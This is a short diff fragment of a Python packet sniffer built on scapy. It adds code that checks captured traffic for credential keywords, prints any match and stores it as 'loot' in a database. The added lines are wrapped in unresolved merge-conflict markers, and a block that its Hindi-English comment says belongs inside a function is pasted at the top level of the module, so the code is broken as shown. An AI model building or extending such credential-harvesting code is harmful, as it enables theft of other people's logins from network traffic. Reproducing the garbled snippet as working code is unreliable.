@@ -4,6 +4,18 @@ import time
 import threading
 import json
 
+<<<<<<< HEAD
+=======
+
+from database import save_loot 
+
+# find_credentials function ke andar jahan print hai:
+if any(word in payload for word in keywords):
+    print(f"[*] POTENTIAL CREDENTIAL FOUND: {payload}")
+    # Ye line add karein:
+    save_loot("Network_Traffic", "CRED_FOUND", payload)
+
+>>>>>>> 1aaf0d9de456e45b6d0102d35ef9f9dceb34bf00
 # Try to import scapy, fallback to simulation if missing
 try:
     from scapy.all import sniff, IP, TCP, UDP, Raw, DNS, DNSQR
